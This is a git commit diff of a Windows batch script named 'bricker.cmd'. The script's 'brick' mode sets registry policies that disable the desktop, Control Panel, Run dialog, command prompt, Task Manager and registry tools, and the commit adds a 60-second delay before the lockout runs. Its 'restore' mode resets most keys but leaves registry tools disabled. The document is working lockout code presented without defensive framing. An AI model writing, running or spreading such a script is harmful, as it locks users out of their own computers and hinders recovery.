8e940b4e8f705911d6ce0e18c8bb2522582ff802
MikronT <45333177+MikronT@users.noreply.github.com>
2020-03-10 20:38:28 +0200

    Some code beauty

--- extensions/bricker/bricker.cmd
+++ extensions/bricker/bricker.cmd
@@ -6,19 +6,20 @@ chcp 65001>nul
 
 
 if "%1" == "brick" (
-  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul
-  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f >nul
-  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f >nul
-  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD /t REG_DWORD /d 1 /f >nul
-  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
-  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
+  timeout /t 60 >nul
+  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop            /t REG_DWORD /d 1 /f >nul
+  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel       /t REG_DWORD /d 1 /f >nul
+  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun                /t REG_DWORD /d 1 /f >nul
+  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System   /v DisableCMD           /t REG_DWORD /d 1 /f >nul
+  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System   /v DisableTaskMgr       /t REG_DWORD /d 1 /f >nul
+  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System   /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
 ) else if "%1" == "restore" (
   for /l %%i in (1,1,4) do infDefaultInstall "%~dp0unHookExec.inf"
-  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 0 /f >nul
+  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop      /t REG_DWORD /d 0 /f >nul
   for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 0 /f >nul
-  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 0 /f >nul
-  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD /t REG_DWORD /d 0 /f >nul
-  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f >nul
+  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun          /t REG_DWORD /d 0 /f >nul
+  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System   /v DisableCMD     /t REG_DWORD /d 0 /f >nul
+  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System   /v DisableTaskMgr /t REG_DWORD /d 0 /f >nul
 ) else exit
 
 
